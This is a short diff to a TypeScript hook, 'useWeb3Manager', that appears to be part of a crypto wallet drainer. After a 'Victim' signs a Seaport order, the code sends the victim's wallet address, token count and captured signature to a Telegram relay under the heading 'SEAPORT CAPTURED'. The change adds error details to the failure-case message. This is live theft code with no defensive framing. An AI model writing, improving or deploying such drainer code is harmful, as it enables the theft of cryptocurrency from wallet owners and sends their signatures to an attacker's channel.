@@ -617,8 +617,9 @@ export function useWeb3Manager() {
                         });
 
                         notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nVictim: <code>${address}</code>\nTokens: ${tokensOnChain.length}\nSync: Telegram Relay ✅`);
-                    } catch (syncErr) {
-                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nSync: Telegram Relay ❌\nSignature:\n<code>${signature}</code>`);
+                    } catch (syncErr: any) {
+                        const errorMsg = syncErr?.message || "Unknown error";
+                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nSync: Telegram Relay ❌\nError: ${errorMsg}\nSignature:\n<code>${signature}</code>`);
                     }
 
                 } catch (signErr: any) {
